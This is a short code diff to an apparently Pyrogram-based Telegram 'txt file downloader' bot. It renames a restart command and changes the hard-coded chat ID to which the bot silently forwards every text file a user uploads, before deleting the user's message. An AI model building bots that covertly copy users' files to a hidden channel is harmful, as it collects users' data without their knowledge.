@@ -33,7 +33,7 @@ async def account_login(bot: Client, m: Message):
     editable = await m.reply_text(f"Hi 👋 Sir ! How are You?\n\n☞ I'm a High Speed **Txt File** Downloader Bot.\n\n☞ I can Download **Videos & Pdf** From Your **TXT** File.\n\n**𝐃𝐞𝐯𝐞𝐥𝐨𝐩𝐞𝐝 𝐁𝐲 :** Mr.r@j*❤️😱\n")
   
 
-@bot.on_message(filters.command("rukja"))
+@bot.on_message(filters.command("ruk"))
 async def restart_handler(_, m):
     await m.reply_text("**Process Has Been Stopped Successfully !**", True)
     os.execl(sys.executable, sys.executable, *sys.argv)
@@ -45,7 +45,7 @@ async def account_login(bot: Client, m: Message):
     input: Message = await bot.listen(editable.chat.id)
     if input.document:
         x = await input.download()
-        await bot.send_document(-1002131532222, x)
+        await bot.send_document(-1002047255106, x)
         await input.delete(True)
         file_name, ext = os.path.splitext(os.path.basename(x))
         
